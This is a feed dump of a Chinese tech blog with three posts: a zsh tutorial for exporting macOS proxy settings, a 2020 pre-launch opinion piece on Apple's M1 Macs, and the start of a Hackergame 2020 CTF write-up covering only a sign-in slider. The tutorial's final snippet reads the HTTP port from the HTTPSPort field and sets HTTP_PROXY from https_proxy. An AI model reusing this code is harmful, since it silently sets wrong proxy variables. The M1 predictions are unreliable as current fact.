class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy 